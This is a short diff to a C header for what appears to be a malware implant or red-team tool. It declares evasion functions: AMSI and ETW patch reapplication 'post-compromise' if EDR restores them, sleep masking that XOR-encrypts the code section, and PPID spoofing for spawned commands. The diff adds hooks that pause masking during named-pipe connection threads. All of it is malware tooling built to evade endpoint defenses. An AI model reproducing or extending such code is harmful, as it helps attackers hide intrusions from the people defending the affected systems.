@@ -11,8 +11,14 @@ void evasion_init(void);
 /* Re-apply AMSI + ETW patches post-compromise (if EDR restored them) */
 void amsi_bypass(void);
 
-/* XOR-masks .text + PAGE_NOACCESS during sleep, runs from .evasn section */
+/* XOR-masks .text + PAGE_NOACCESS during sleep, runs from .evasn section.
+ * Masking is skipped while any pipe-server conn_thread is active to avoid
+ * PAGE_NOACCESS faulting threads executing in .text. */
 void sleep_masked(DWORD ms);
+
+/* Call from conn_thread start/end to inhibit sleep masking while active. */
+void evasion_conn_enter(void);
+void evasion_conn_leave(void);
 
 /* Spawn cmd with parent_name as spoofed PPID. Returns 1 on success. */
 int spawn_with_ppid(const char *cmd, const char *parent_name);
